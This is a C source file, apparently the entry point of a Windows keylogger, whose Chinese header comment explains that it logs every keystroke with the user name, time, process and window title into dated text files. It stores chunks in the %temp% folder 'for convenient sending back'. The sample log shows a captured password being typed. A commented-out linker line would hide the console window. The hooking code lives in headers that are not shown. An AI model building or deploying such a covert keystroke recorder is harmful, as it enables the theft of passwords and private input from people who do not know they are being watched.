/*
功能说明:
	win32控制台程序  实现本机离线记录的功能  将所有操作的信息记录进txt文件中
	Filename为本地缓存的内容 默认为日期.txt  例如2019-04-03.txt 记录当天用户所有的输入
	keylog_main() 为主要的键盘记录函数
		查找当前最靠前的窗口 如果变化则记录
			信息格式为 ：当前用户 ## 时间 ## 进程名称 ## 窗口标题
						 按键内容		
				例如：
				just4fun ## 2019/04/03 15:59:57 ## D:\Notepad++\notepad++.exe ## Selected Tab
				amin[Enter]
				Password[Enter]
				6666666666666[Enter]
		实时记录: 当缓冲区达到一定的长度MAXFILELENGTH后 保存到%temp%目录下新文件中 命名为日期.txt 如 2019.4.3_15.58.50.txt
			方便回传操作 C:\Users\[用户名]\AppData\Local\Temp\2019.4.3_15.58.50.txt

	待修改的部分:
	判断当前窗口 是否改变 如果改变则记录 否则不记录
*/

#include "common.h"
#include "keyLog.h"
#include "file.h"
#include <time.h>

//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // 设置窗口隐藏属性
int main()
{
	//生成日志文件
	Filename = generateLogFile();
	//开始记录键盘
	keylog_main();
 	system("pause");
	return 0;
}